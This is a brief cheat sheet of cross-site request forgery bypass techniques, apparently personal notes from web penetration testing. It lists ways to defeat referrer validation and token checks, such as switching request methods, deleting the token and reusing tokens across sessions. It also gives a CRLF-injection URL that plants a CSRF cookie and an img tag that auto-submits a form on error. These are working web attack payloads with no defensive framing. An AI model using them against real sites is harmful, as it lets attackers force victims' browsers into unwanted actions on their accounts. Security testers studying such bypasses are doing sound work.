# Cross-site request forgery (CSRF)
## Test first:
Referrer: https://example.com
if:
"Invalid referrer header" so:
```js
Referrer-Policy: unsafe-url
```
"Invalid referrer validation" so:
```html
<meta name="referrer" content="no-referrer">
```
else:
csrf without csrf protection - EZ
csrf validation depends on request method  - Change post to get
csrf delete csrf parameter
csrf - drop request and test the token in other session 
csrf + crlf - /?search=test%0d%0aSet-Cookie:%20csrfKey=your-key
<img src="https://domain/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()">
